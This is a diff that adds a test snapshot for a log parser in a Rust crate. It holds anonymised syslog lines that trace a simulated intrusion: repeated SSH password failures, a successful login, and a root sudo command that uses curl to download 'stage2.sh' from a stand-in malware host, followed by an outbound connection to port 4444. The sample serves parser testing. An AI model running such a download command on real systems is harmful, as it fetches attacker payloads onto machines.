@@ -1,0 +1,9 @@
+---
+source: crates/sudare-core/tests/parsers.rs
+expression: p.input.text()
+---
+<34>Oct 29 14:11:40 [[HOST_4]] sshd[2211]: Failed password for [[USER_37]] from 198.51.100.23 port 51122 ssh2
+<34>Oct 29 14:11:42 [[HOST_4]] sshd[2211]: Failed password for [[USER_37]] from 198.51.100.23 port 51123 ssh2
+<38>Oct 29 14:12:05 [[HOST_4]] sshd[2211]: Accepted password for [[USER_37]] from 198.51.100.23 port 51130 ssh2
+<86>Oct 29 14:12:06 [[HOST_4]] sudo:     [[USER_37]] : TTY=pts/0 ; PWD=/home/[[USER_37]] ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/x http://malware.example.org/stage2.sh
+<14>Oct 29 14:12:09 [[HOST_4]] kernel: OUTBOUND conn src=[[IP_INTERNAL_12]] dst=203.0.113.50 dpt=4444 user=[[USER_37]] host=[[FQDN_INTERNAL_28]]
